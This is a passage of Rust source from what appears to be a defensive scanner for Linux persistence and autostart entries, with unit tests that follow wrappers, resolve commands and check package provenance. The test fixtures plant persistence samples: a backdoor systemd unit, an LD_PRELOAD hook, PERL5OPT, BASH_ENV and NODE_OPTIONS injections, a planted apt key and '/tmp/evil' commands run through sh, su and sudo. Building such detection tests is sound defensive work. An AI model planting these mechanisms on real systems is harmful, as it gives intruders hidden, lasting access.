                    out.push(("python", program.into_bytes()));
                }
            }
        }
    }
    out
}

/// The contents of a Python string literal at the start of `s`, where it is a
/// plain one. An f-string is built at run time, so its `f` prefix is not
/// skipped and it is not read; nor is a literal that spans lines.
fn python_string(s: &str) -> Option<String> {
    let s = s.trim_start_matches(['r', 'b', 'R', 'B']);
    let quote = s.chars().next().filter(|c| *c == '\'' || *c == '"')?;
    let body = &s[1..];
    let mut out = String::new();
    let mut chars = body.chars();
    while let Some(c) = chars.next() {
        match c {
            '\\' => out.push(chars.next()?),
            c if c == quote => return Some(out),
            c => out.push(c),
        }
    }
    None
}

/// Where a shell script hands control on: `source` and `.` pull a second file
/// into the running shell, `exec` replaces the shell with one. Only a literal
/// absolute path counts, because a word carrying a `$` is the shell's to
/// expand and this pass does not run shells.
fn handed_off(head: &[u8]) -> Vec<(&'static str, Vec<u8>)> {
    let mut out = Vec::new();
    for line in head.split(|b| *b == b'\n').skip(1) {
        let mut words = line.split(|b: &u8| b.is_ascii_whitespace()).filter(|w| !w.is_empty());
        let Some(verb) = words.next() else { continue };
        let via = if verb == b"." || verb == b"source" {
            "source"
        } else if verb == b"exec" {
            "exec"
        } else {
            continue;
        };
        let Some(word) = words.next() else { continue };
        // Perl writes `exec "/usr/bin/x", @ARGV;` — the quotes and the list
        // punctuation are the language's, not the path's.
        let word: Vec<u8> = word.iter().copied().filter(|b| *b != b'"' && *b != b'\'').collect();
        let end = word.iter().rposition(|b| *b != b',' && *b != b';').map_or(0, |i| i + 1);
        let word = word[..end].to_vec();
        if word.first() == Some(&b'/') && !word.contains(&b'$') {
            out.push((via, word));
        }
    }
    out
}

/// How `text` tests for `path` before running it, if it does: a shell or
/// perl file test (`[ -x /bin/plymouth ] && /bin/plymouth`, `exec "/x"
/// if -x "/x"`), `command -v`, `which` or `type`, or Python's
/// `os.path.exists`, `os.path.isfile`, `os.access` and `shutil.which`. A
/// program a script runs only after finding it is not an orphan when it
/// is absent; the script is written for hosts without it.
/// How far back from a program's name a guard for it is looked for. Longer
/// than any `[ -x … ] &&`, `command -v` or `os.path.exists(` idiom, and the
/// three lines an environment-variable `if` may span.
const GUARD_WINDOW: usize = 512;

fn guarded_by_test(text: &[u8], path: &[u8]) -> Option<String> {
    const TESTS: [&str; 5] = ["-x", "-e", "-f", "-s", "-r"];
    const CALLS: [&str; 6] = ["command -v", "which", "type", "os.path.exists(", "os.path.isfile(", "os.access("];
    const PY_CALLS: [&str; 1] = ["shutil.which("];
    if path.is_empty() {
        return None;
    }
    let mut from = 0;
    while let Some(i) = text[from..].windows(path.len()).position(|w| w == path) {
        let at = from + i;
        from = at + 1;
        // The path must end where a word ends.
        if text.get(at + path.len()).is_some_and(|b| !b.is_ascii_whitespace() && !b"\"')];&|".contains(b)) {
            continue;
        }
        // Only the text just before the path can be a guard for it, and a
        // prefix built per occurrence made this quadratic: a user unit
        // naming one path sixty thousand times stalled a root scan for 13 s.
        let before = String::from_utf8_lossy(&text[at.saturating_sub(GUARD_WINDOW)..at]).into_owned();
        // A hand-off inside an `if` on an environment variable — debconf's
        // dpkg-preconfigure execs cdebconf's only when DEBCONF_USE_CDEBCONF
        // is set — runs when a person asks for it, not unbidden.
        let recent: Vec<&str> = before.lines().rev().take(3).collect();
        if recent.iter().any(|l| l.contains("if") && ["$ENV{", "getenv(", "os.environ", "os.getenv("].iter().any(|e| l.contains(e))) {
            return Some("environment variable test".to_string());
        }
        let before = before.trim_end_matches(['"', '\'']).trim_end();
        for t in TESTS {
            let ok = before.ends_with(t)
                && before[..before.len() - t.len()].ends_with(|c: char| c.is_whitespace() || c == '[' || c == '(');
            if ok {
                return Some(format!("{t} test"));
            }
        }
        let before = before.trim_end_matches('(').trim_end();
        for c in CALLS.iter().chain(PY_CALLS.iter()) {
            let c = c.trim_end_matches('(');
            if before.ends_with(c) && before[..before.len() - c.len()].ends_with(|ch: char| !ch.is_alphanumeric() && ch != '_' && ch != '.') {
                return Some(c.to_string());
            }
            if before.ends_with(c) && before.len() == c.len() {
                return Some(c.to_string());
            }
        }
    }
    None
}

/// Counts for the run summary, kept here so the renderer stays a renderer.
pub fn flag_counts(scan: &Scan) -> BTreeMap<Flag, usize> {
    let mut out = BTreeMap::new();
    for e in &scan.entries {
        for f in &e.flags {
            *out.entry(*f).or_insert(0) += 1;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::entry::Trigger;
    use crate::scan::{self, Collector, Ctx, Options};

    struct Planted;

    impl Collector for Planted {
        fn name(&self) -> &'static str {
            "planted"
        }

        fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
            let mut out = Vec::new();

            let mut e = cx.entry(Kind::SystemdUnit, "etc/systemd/system/evil.service", "evil.service");
            e.command = Some(b"/opt/backdoor --quiet".to_vec());
            e.target_path = Some(PathBuf::from("/opt/backdoor"));
            out.push(e);

            let mut e = cx.entry(Kind::SystemdUnit, "etc/systemd/system/ghost.service", "ghost.service");
            e.command = Some(b"/usr/bin/vanished".to_vec());
            e.target_path = Some(PathBuf::from("/usr/bin/vanished"));
            out.push(e);

            let mut e = cx.entry(Kind::ShellProfile, "etc/profile", "profile");
            e.note("env.LD_PRELOAD", "/tmp/hook.so");
            e.trigger = Trigger::Login;
            out.push(e);

            let mut e = cx.entry(Kind::SystemdUnit, "etc/systemd/system/linked.service", "linked.service");
            e.command = Some(b"/tmp/staging/run.sh".to_vec());
            out.push(e);

            let mut e = cx.entry(Kind::Cron, "etc/cron.d/job", "abc123");
            e.command = Some(b"do-something-unparseable".to_vec());
            out.push(e);

            out
        }
    }

    fn scanned(dir: &Path) -> (Root, Scan) {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Planted)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);
        (Root::at(dir).unwrap(), scan)
    }

    fn find<'a>(scan: &'a Scan, name: &str) -> &'a Entry {
        scan.entries.iter().find(|e| e.name == name).unwrap_or_else(|| panic!("no entry named {name}"))
    }

    #[test]
    fn a_panicking_stage_costs_its_own_facts_and_nothing_else() {
        let mut failed = Vec::new();
        assert_eq!(stage(&mut failed, "fine", || 7), Some(7));
        assert_eq!(stage(&mut failed, "provenance", || -> u8 { panic!("rpm header lies about its length") }), None);
        assert_eq!(failed, vec!["provenance: rpm header lies about its length".to_string()]);

        let mut entries = vec![
            Entry::new(Kind::Cron, "/etc/crontab", "a"),
            Entry::new(Kind::Cron, "/etc/crontab", "b"),
            Entry::new(Kind::Cron, "/etc/crontab", "c"),
        ];
        let mut failed = Vec::new();
        per_entry(&mut failed, "encoding", &mut entries, |e| {
            if e.name == "b" {
                panic!("hostile bytes");
            }
            e.flag(Flag::EncodingAnomaly);
        });
        assert!(entries[0].has_flag(Flag::EncodingAnomaly) && entries[2].has_flag(Flag::EncodingAnomaly));
        assert_eq!(entries[1].raw["enrichment_failed"], "encoding: hostile bytes");
        assert_eq!(failed.len(), 1);
        assert!(failed[0].contains(entries[1].short_id()));
    }

    #[test]
    fn an_entry_read_from_a_kernel_interface_is_judged_by_its_target() {
        // /proc/modules is nobody's file, but the .ko it names is packaged
        // like any other. Skipping the whole entry in the provenance pass
        // left every loaded module on every live host unknown, and shown.
        let dir = std::env::temp_dir().join(format!("unbidden-kernel-target-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["proc/sys/kernel", "lib/modules/6.1/kernel/fs/9p", "sbin", "var/lib/dpkg/info"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("proc/modules"), b"9p 12345 0 - Live 0x0\n").unwrap();
        std::fs::write(dir.join("proc/sys/kernel/modprobe"), b"/sbin/modprobe\n").unwrap();
        std::fs::write(dir.join("lib/modules/6.1/kernel/fs/9p/9p.ko"), b"ko").unwrap();
        std::fs::write(dir.join("sbin/modprobe"), b"elf").unwrap();
        let md5 = |b: &[u8]| {
            use md5::Digest as _;
            crate::entry::hex(&md5::Md5::digest(b))
        };
        std::fs::write(
            dir.join("var/lib/dpkg/status"),
            b"Package: linux-modules\nStatus: install ok installed\nVersion: 6.1\n\nPackage: kmod\nStatus: install ok installed\nVersion: 30\n\n",
        )
        .unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/linux-modules.list"), b"/lib/modules/6.1/kernel/fs/9p/9p.ko\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/linux-modules.md5sums"), format!("{}  lib/modules/6.1/kernel/fs/9p/9p.ko\n", md5(b"ko"))).unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/kmod.list"), b"/sbin/modprobe\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/kmod.md5sums"), format!("{}  sbin/modprobe\n", md5(b"elf"))).unwrap();

        let root = Root::at(&dir).unwrap();
        let mut scan = scan::run(&root, &Options { deep: false }, &[]);
        let mut module = Entry::new(Kind::KernelModule, dir.join("proc/modules"), "9p");
        module.target_path = Some(dir.join("lib/modules/6.1/kernel/fs/9p/9p.ko"));
        let mut callout = Entry::new(Kind::KernelCallout, dir.join("proc/sys/kernel/modprobe"), "modprobe");
        callout.target_path = Some(dir.join("sbin/modprobe"));
        callout.command = Some(b"/sbin/modprobe".to_vec());
        scan.entries.extend([module, callout]);
        enrich(&root, &mut scan);

        let module = scan.entries.iter().find(|e| e.name == "9p").unwrap();
        assert!(module.provenance.is_packaged_intact(), "{:?}", module.provenance);
        assert!(!module.raw.contains_key("provenance_caveat"));
        let callout = scan.entries.iter().find(|e| e.name == "modprobe").unwrap();
        assert!(callout.provenance.is_packaged_intact(), "{:?}", callout.provenance);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_bare_command_is_resolved_before_its_provenance_is_asked() {
        // `* * * * * root backdoor` names /usr/local/bin/backdoor as surely
        // as an absolute path does. Resolving it after the provenance pass
        // meant the file that actually runs was never looked up, and nothing
        // behind it was followed either.
        let dir = std::env::temp_dir().join(format!("unbidden-bare-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["etc/cron.d", "etc/alternatives", "usr/local/bin", "usr/bin", "tmp", "var/lib/dpkg/info"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("etc/cron.d/job"), b"* * * * * root backdoor\n* * * * * root editor\n* * * * * root tracker\n").unwrap();
        std::fs::write(dir.join("usr/bin/tracker"), b"#!/usr/bin/python3\n").unwrap();
        std::fs::write(dir.join("usr/bin/python3.10"), b"py").unwrap();
        std::os::unix::fs::symlink("python3.10", dir.join("usr/bin/python3")).unwrap();
        std::fs::write(dir.join("usr/bin/shipped-job"), b"* * * * * root /bin/true\n").unwrap();
        std::os::unix::fs::symlink("/usr/bin/shipped-job", dir.join("etc/cron.d/alias")).unwrap();
        std::fs::write(dir.join("usr/local/bin/backdoor"), b"#!/tmp/interp\nexit 0\n").unwrap();
        std::fs::write(dir.join("tmp/interp"), b"elf").unwrap();
        std::fs::write(dir.join("usr/bin/vim.basic"), b"vim").unwrap();
        std::os::unix::fs::symlink("/etc/alternatives/editor", dir.join("usr/bin/editor")).unwrap();
        std::os::unix::fs::symlink("/usr/bin/vim.basic", dir.join("etc/alternatives/editor")).unwrap();
        let md5 = |b: &[u8]| {
            use md5::Digest as _;
            crate::entry::hex(&md5::Md5::digest(b))
        };
        std::fs::write(
            dir.join("var/lib/dpkg/status"),
            b"Package: vim\nStatus: install ok installed\nVersion: 9\n\n\
              Package: python3-minimal\nStatus: install ok installed\nVersion: 3.10\n\n\
              Package: python3.10-minimal\nStatus: install ok installed\nVersion: 3.10.4\n\n\
              Package: jobs\nStatus: install ok installed\nVersion: 1\n\n",
        )
        .unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/vim.list"), b"/usr/bin/vim.basic\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/vim.md5sums"), format!("{}  usr/bin/vim.basic\n", md5(b"vim"))).unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/python3-minimal.list"), b"/usr/bin/python3\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/python3.10-minimal.list"), b"/usr/bin/python3.10\n").unwrap();
        std::fs::write(
            dir.join("var/lib/dpkg/info/python3.10-minimal.md5sums"),
            format!("{}  usr/bin/python3.10\n", md5(b"py")),
        )
        .unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/jobs.list"), b"/usr/bin/shipped-job\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/jobs.md5sums"), format!("{}  usr/bin/shipped-job\n", md5(b"* * * * * root /bin/true\n"))).unwrap();

        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(crate::collect::cron::Cron)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);
        let by_command = |c: &str| {
            scan.entries
                .iter()
                .find(|e| e.command.as_deref() == Some(c.as_bytes()) && !e.raw.contains_key("declared_by_entry"))
                .unwrap_or_else(|| panic!("no entry running {c}"))
        };

        let backdoor = by_command("backdoor");
        assert_eq!(backdoor.target_path.as_deref(), Some(dir.join("usr/local/bin/backdoor").as_path()));
        assert_eq!(backdoor.raw["target_provenance"], "unpackaged");
        assert!(backdoor.has_flag(Flag::Unpackaged));
        let chained = scan
            .entries
            .iter()
            .find(|e| e.raw.get("declared_by_entry") == Some(&backdoor.id))
            .expect("the script behind the bare name is followed to its interpreter");
        assert_eq!(chained.name, "/tmp/interp");
        assert!(chained.has_flag(Flag::Unpackaged));

        // A script's interpreter reached through a link dpkg cannot verify:
        // /usr/bin/python3 -> python3.10 is listed by one package and the
        // file it names is shipped, with a digest, by another.
        let chained = scan.entries.iter().find(|e| e.name == "/usr/bin/python3").expect("the shebang is followed");
        assert!(matches!(
            &chained.provenance,
            Provenance::Packaged { package, integrity: Integrity::Intact, .. } if package == "python3.10-minimal"
        ), "{:?}", chained.provenance);
        assert_eq!(chained.raw["resolves_to"], dir.join("usr/bin/python3.10").to_string_lossy());

        // An alias link that is an entry's own source keeps its own verdict:
        // the link is the evidence.
        let alias = scan.entries.iter().find(|e| e.source == dir.join("etc/cron.d/alias")).expect("alias");
        assert!(alias.has_flag(Flag::Unpackaged));

        // An update-alternatives link belongs to no package; the file at the
        // end of it does, and is what runs.
        let editor = by_command("editor");
        assert_eq!(editor.raw["target_provenance"], "vim (intact)");
        assert_eq!(editor.raw["target_resolves_to"], dir.join("usr/bin/vim.basic").to_string_lossy());
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_super_server_service_runs_only_while_its_daemon_does() {
        let service = |daemon: &str| {
            let mut e = Entry::new(Kind::InetdService, "/etc/xinetd.d/telnet", format!("telnet-{daemon}"));
            e.note("daemon", daemon);
            e.enabled = Enablement::Enabled;
            e
        };
        let daemon = |kind: Kind, name: &str, state: Enablement| {
            let mut e = Entry::new(kind, format!("/x/{name}"), name);
            e.enabled = state;
            e
        };
        let run = |mut entries: Vec<Entry>| {
            gate_on_super_server(&mut entries);
            entries.into_iter().filter(|e| e.kind == Kind::InetdService).map(|e| (e.enabled, e.raw["daemon_state"].clone())).collect::<Vec<_>>()
        };

        // The unit decides over the init script it replaces.
        let got = run(vec![
            service("xinetd"),
            daemon(Kind::SystemdUnit, "xinetd.service", Enablement::Disabled),
            daemon(Kind::SysvInit, "xinetd", Enablement::Enabled),
        ]);
        assert_eq!(got, [(Enablement::Disabled, "xinetd systemd unit disabled".to_string())]);
        // What the service file said is kept beside what the daemon decided.
        let mut entries = vec![service("xinetd"), daemon(Kind::SystemdUnit, "xinetd.service", Enablement::Disabled)];
        gate_on_super_server(&mut entries);
        assert_eq!(entries[0].raw["inferred_enablement"], "enabled");
        // A vendor unit disabled and an /etc copy enabled: it runs.
        let got = run(vec![
            service("xinetd"),
            daemon(Kind::SystemdUnit, "xinetd.service", Enablement::Disabled),
            daemon(Kind::SystemdUnit, "xinetd.service", Enablement::Enabled),
        ]);
        assert_eq!(got[0].0, Enablement::Enabled);
        // Only an init script, as Debian's openbsd-inetd ships.
        let got = run(vec![service("inetd"), daemon(Kind::SysvInit, "openbsd-inetd", Enablement::Disabled)]);
        assert_eq!(got, [(Enablement::Disabled, "inetd init script disabled".to_string())]);
        // Nothing found: the service keeps its own setting, and says so.
        let got = run(vec![service("xinetd")]);
        assert_eq!(got, [(Enablement::Enabled, "no unit or init script for xinetd found".to_string())]);
    }

    #[test]
    fn tcpd_is_looked_through_to_the_server_it_wraps() {
        let dir = std::env::temp_dir().join(format!("unbidden-tcpd-{}", std::process::id()));
        std::fs::create_dir_all(dir.join("usr/sbin")).unwrap();
        for f in ["usr/sbin/tcpd", "usr/sbin/in.telnetd"] {
            std::fs::write(dir.join(f), b"").unwrap();
        }
        let root = Root::at(&dir).unwrap();
        let mut e = Entry::new(Kind::InetdService, dir.join("etc/xinetd.d/telnet"), "telnet");
        e.command = Some(b"/usr/sbin/tcpd /usr/sbin/in.telnetd".to_vec());
        e.target_path = Some(dir.join("usr/sbin/tcpd"));
        look_through_wrappers(&root, std::slice::from_mut(&mut e));
        assert_eq!(e.target_path, Some(dir.join("usr/sbin/in.telnetd")));
        assert_eq!(e.raw["target_wrapped_by"], "tcpd");
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn interpreter_variables_become_entries_about_what_they_load() {
        let dir = std::env::temp_dir().join(format!("unbidden-interp-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("etc")).unwrap();
        std::fs::write(dir.join("etc/passwd"), "root:x:0:0::/root:/bin/sh\n").unwrap();
        std::fs::write(
            dir.join("etc/environment"),
            "PERL5OPT=-Mevil\nBASH_ENV=/opt/every-script.sh\nNODE_OPTIONS=--max-old-space-size=64 --require /opt/hook.js\nLANG=C\n",
        )
        .unwrap();
        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(crate::collect::shell::Shell)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);
        let get = |v: &str| scan.entries.iter().find(|e| e.kind == Kind::InterpreterEnv && e.name == v).unwrap_or_else(|| panic!("no {v}"));
        let perl = get("PERL5OPT");
        assert_eq!((perl.command.as_deref(), perl.target_path.as_deref()), (Some(&b"PERL5OPT=-Mevil"[..]), None));
        let carrier = scan.entries.iter().find(|e| e.kind == Kind::ShellProfile && e.source == dir.join("etc/environment")).unwrap();
        assert_eq!(perl.provenance, carrier.provenance, "no file named, so the setting's own file vouches");
        assert_eq!(get("BASH_ENV").target_path, Some(dir.join("opt/every-script.sh")));
        assert_eq!(get("NODE_OPTIONS").target_path, Some(dir.join("opt/hook.js")));
        assert!(get("BASH_ENV").raw["read_by"].contains("non-interactive bash"));
        assert!(!scan.entries.iter().any(|e| e.kind == Kind::InterpreterEnv && e.name == "LANG"));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_repository_is_vouched_for_only_by_keys_all_packaged_and_intact() {
        let key = |path: &str, ok: bool| {
            let mut e = Entry::new(Kind::PkgSource, path, format!("key:{path}"));
            e.provenance = if ok {
                Provenance::Packaged { package: "debian-archive-keyring".into(), version: "1".into(), integrity: crate::entry::Integrity::Intact }
            } else {
                Provenance::Unpackaged
            };
            e
        };
        let repo = |trusts: &str, off: bool| {
            let mut e = Entry::new(Kind::PkgSource, "/etc/apt/sources.list.d/x.sources", format!("apt:{trusts}"));
            e.note("trusts", trusts);
            if off {
                e.note("signature_checking", "off (trusted=yes)");
            }
            e
        };
        let mut entries = vec![
            key("/usr/share/keyrings/a.gpg", true),
            key("/etc/apt/trusted.gpg.d/planted.asc", false),
            repo("/usr/share/keyrings/a.gpg", false),
            repo("/usr/share/keyrings/a.gpg, /etc/apt/trusted.gpg.d/planted.asc", false),
            repo("/usr/share/keyrings/a.gpg", true),
            repo("/nowhere.gpg", false),
        ];
        vouch_for_sources(&mut entries);
        let vouched: Vec<bool> = entries[2..].iter().map(|e| e.raw.contains_key("vouched")).collect();
        assert_eq!(vouched, [true, false, false, false], "a planted key, trusted=yes or a missing key each withhold it");
    }

    #[test]
    fn an_inittab_line_is_vouched_for_by_a_verified_template() {
        // An offline root, whose paths carry the mount prefix.
        let dir = std::env::temp_dir().join(format!("unbidden-vouch-template-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let root = Root::at(&dir).unwrap();
        let template = root.abs("usr/share/sysvinit/inittab").display().to_string();
        let line = |name: &str, has_template: bool| {
            let mut e = Entry::new(Kind::Inittab, root.abs("etc/inittab"), name);
            if has_template {
                e.note("matches_template", template.clone());
            }
            e
        };
        let mut entries = vec![line("1", true), line("ev", false), line("2", true)];
        let mut answers = provenance::Answers::new();
        answers.insert(
            PathBuf::from("usr/share/sysvinit/inittab"),
            Provenance::Packaged { package: "sysvinit-core".into(), version: "3.14-4".into(), integrity: crate::entry::Integrity::Intact },
        );
        vouch_for_templates(&root, &mut entries, &answers);
        let vouched: Vec<bool> = entries.iter().map(|e| e.raw.contains_key("vouched")).collect();
        assert_eq!(vouched, [true, false, true]);

        answers.insert(
            PathBuf::from("usr/share/sysvinit/inittab"),
            Provenance::Packaged { package: "sysvinit-core".into(), version: "3.14-4".into(), integrity: crate::entry::Integrity::Modified },
        );
        let mut entries = vec![line("1", true)];
        vouch_for_templates(&root, &mut entries, &answers);
        assert!(!entries[0].raw.contains_key("vouched"), "an edited template vouches for nothing");
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_wrapper_is_looked_through_to_what_it_runs() {
        let dir = std::env::temp_dir().join(format!("unbidden-wrappers-{}", std::process::id()));
        for d in ["usr/bin", "usr/local/bin", "bin", "sbin", "opt"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        for f in [
            "usr/bin/env", "usr/bin/nice", "usr/bin/sudo", "usr/bin/timeout", "usr/bin/flock", "usr/bin/true",
            "usr/bin/cat", "usr/bin/logger", "usr/bin/sed", "bin/sh", "bin/bash", "sbin/modprobe",
            "usr/local/bin/evil", "opt/x", "usr/bin/su", "usr/bin/runuser", "bin/busybox",
        ] {
            std::fs::write(dir.join(f), b"").unwrap();
        }
        let root = Root::at(&dir).unwrap();
        let run = |command: &str, target: Option<&str>| {
            let mut e = Entry::new(Kind::SystemdUnit, dir.join("etc/systemd/system/u.service"), "u.service");
            e.command = Some(command.as_bytes().to_vec());
            e.target_path = target.map(|t| dir.join(t));
            let more = look_through_wrappers(&root, std::slice::from_mut(&mut e));
            (e, more)
        };
        let lands = |command: &str, target: &str, want: Option<&str>, by: &str| {
            let (e, more) = run(command, Some(target));
            assert_eq!(e.target_path, want.map(|w| dir.join(w)), "{command}");
            assert_eq!(e.raw.get("target_wrapped_by").map(String::as_str), Some(by), "{command}");
            assert!(more.is_empty(), "{command}");
        };

        lands("env FOO=1 evil", "usr/bin/env", Some("usr/local/bin/evil"), "env");
        lands("-/usr/bin/nice -n 5 /opt/x --flag", "usr/bin/nice", Some("opt/x"), "nice");
        lands("/bin/sh -c '/opt/x --quiet'", "bin/sh", Some("opt/x"), "sh");
        lands("/bin/sh /opt/x", "bin/sh", Some("opt/x"), "sh");
        lands("/bin/sh -c 'exec evil --daemon'", "bin/sh", Some("usr/local/bin/evil"), "sh exec");
        lands("sudo -u bob env nohup evil", "usr/bin/sudo", Some("usr/local/bin/evil"), "sudo env nohup");
        lands("timeout -s KILL 30 evil", "usr/bin/timeout", Some("usr/local/bin/evil"), "timeout");
        lands("flock /run/l -c 'evil a'", "usr/bin/flock", Some("usr/local/bin/evil"), "flock");
        lands("flock /run/l /opt/x", "usr/bin/flock", Some("opt/x"), "flock");
        // A -c inside a cluster of short options.
        lands("/bin/bash -lc '/opt/x --y'", "bin/bash", Some("opt/x"), "bash");
        lands("/bin/sh -ec '/usr/bin/true'", "bin/sh", Some("usr/bin/true"), "sh");
        lands("/usr/bin/env -S \"/tmp/evil a\"", "usr/bin/env", Some("tmp/evil"), "env");
        lands("/bin/sh -c 'FOO=1 BAR=2 /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh");
        // Another user's shell, on -c text or the command runuser -u execs.
        lands("su -c /tmp/evil nobody", "usr/bin/su", Some("tmp/evil"), "su");
        lands("/usr/bin/su - root -s /bin/sh -c '/opt/x --y'", "usr/bin/su", Some("opt/x"), "su");
        lands("/usr/bin/su -lc /opt/x nobody", "usr/bin/su", Some("opt/x"), "su");
        lands("runuser -u nobody -- /tmp/evil a", "usr/bin/runuser", Some("tmp/evil"), "runuser");
        lands("runuser -l nobody --command=/opt/x", "usr/bin/runuser", Some("opt/x"), "runuser");
        lands("busybox sh -c /tmp/evil", "bin/busybox", Some("tmp/evil"), "busybox sh");
        // No -c: su is what runs, an interactive shell, and the user is not a program.
        let (e, more) = run("su nobody", Some("usr/bin/su"));
        assert_eq!((e.target_path, e.raw.get("target_wrapped_by"), more.len()), (Some(dir.join("usr/bin/su")), None, 0));
        // A trap's action runs when its signal arrives; reset and ignore run
        // nothing.
        let (e, more) = run("/bin/sh -c 'trap \"/opt/x --cleanup\" EXIT INT; /usr/bin/true'", Some("bin/sh"));
        let all: Vec<&Entry> = std::iter::once(&e).chain(more.iter()).collect();
        assert!(
            all.iter().any(|x| x.target_path.as_deref() == Some(dir.join("opt/x").as_path()) && x.raw.get("target_wrapped_by").is_some_and(|b| b.ends_with("trap"))),
            "the trap action is a program the script runs: {:?}",
            all.iter().map(|x| (x.target_path.clone(), x.raw.get("target_wrapped_by").cloned())).collect::<Vec<_>>()
        );
        lands("/bin/sh -c 'trap - EXIT; trap \"\" INT; trap -p; /usr/bin/true'", "bin/sh", Some("usr/bin/true"), "sh");
        // A builtin in front no longer stands in for the command after it.
        lands("/bin/sh -c 'true; /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh");
        lands("/bin/sh -c '[ -x /tmp/evil ] && /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh");
        // A collector that found no target in text opening with a test.
        let (e, more) = run("[ ! -f /run/x ] || /opt/x --go || true", None);
        assert_eq!((e.target_path, more.len()), (Some(dir.join("opt/x")), 0));
        assert_eq!(resolve_bare_command(&root, Kind::PkgHook, b"[ -f /run/x ] && evil"), Some(dir.join("usr/local/bin/evil")));
        lands("/bin/sh -c 'builtin cd /tmp; /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh");
        lands("/bin/sh -c 'command /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh command");
        lands("/bin/sh -c 'time -p /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh time");
        // A loop header is not a command; the body is.
        lands("/bin/sh -c 'for f in /a /b; do /tmp/evil \"$f\"; done'", "bin/sh", Some("tmp/evil"), "sh");
        // Naming nothing that can be found reads as unresolvable, not as the
        // wrapper.
        lands("/bin/sh -c 'cd /tmp && ./evil'", "bin/sh", None, "sh");
        lands("env", "usr/bin/env", None, "env");
        lands("env notinstalled", "usr/bin/env", None, "env");

        // More than one program: one entry each, declared by the carrier,
        // whose own target stays the shell.
        let many = |command: &str, want: &[Option<&str>]| {
            let (e, more) = run(command, Some("bin/sh"));
            assert_eq!(e.target_path, Some(dir.join("bin/sh")), "{command}");
            assert_eq!(e.raw["runs_commands"], want.len().to_string(), "{command}");
            let got: Vec<_> = more.iter().map(|m| m.target_path.clone()).collect();
            assert_eq!(got, want.iter().map(|w| w.map(|w| dir.join(w))).collect::<Vec<_>>(), "{command}");
            for m in &more {
                assert_eq!(m.raw["declared_by_entry"], e.id);
                assert_eq!(m.source, e.source);
            }
            more
        };
        many("/bin/sh -c '/opt/x; /sbin/modprobe nf_tables'", &[Some("opt/x"), Some("sbin/modprobe")]);
        many("/bin/sh -c 'evil|logger'", &[Some("usr/local/bin/evil"), Some("usr/bin/logger")]);
        many("/bin/sh -c '/opt/x -i $$1 2>/dev/null | sed -n p >&2'", &[Some("opt/x"), Some("usr/bin/sed")]);
        many("/bin/sh -c \"/opt/x -- $(cat /proc/cmdline)\"", &[Some("opt/x"), Some("usr/bin/cat")]);
        many("/bin/sh -c 'cat /f | xargs -0 -I {} /opt/x {}'", &[Some("usr/bin/cat"), Some("opt/x")]);
        let named = many("/bin/sh -c '$CMD --go; /opt/x'", &[None, Some("opt/x")]);
        assert_eq!(named[0].name, "$CMD", "an unknowable command word is still named");

        // Only builtins, or a shell with nothing to run: the shell is what runs.
        for bare in ["/bin/sh -c 'true'", "-/bin/sh"] {
            let (e, more) = run(bare, Some("bin/sh"));
            assert_eq!(e.target_path, Some(dir.join("bin/sh")), "{bare}");
            assert!(!e.raw.contains_key("target_wrapped_by") && more.is_empty(), "{bare}");
        }
        // Shell text as the whole command, as cron runs it.
        let (cron, _) = run("true; /tmp/evil", Some("usr/bin/true"));
        assert_eq!(cron.target_path, Some(dir.join("tmp/evil")));
        assert!(!cron.raw.contains_key("target_wrapped_by"), "nothing wrapped it");
        // Not a wrapper, or a target the collector took from elsewhere.
        let (plain, more) = run("/opt/x arg", Some("opt/x"));
        assert_eq!(plain.target_path, Some(dir.join("opt/x")));
        assert!(plain.raw.is_empty() && more.is_empty());
        let (elsewhere, _) = run("env evil", Some("usr/lib/security/pam_exec.so"));
        assert_eq!(elsewhere.target_path, Some(dir.join("usr/lib/security/pam_exec.so")));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_program_a_script_tests_for_before_running_is_not_an_orphan() {
        let dir = std::env::temp_dir().join(format!("unbidden-guarded-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["etc/cron.d", "usr/share/u", "usr/sbin", "usr/bin", "opt"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
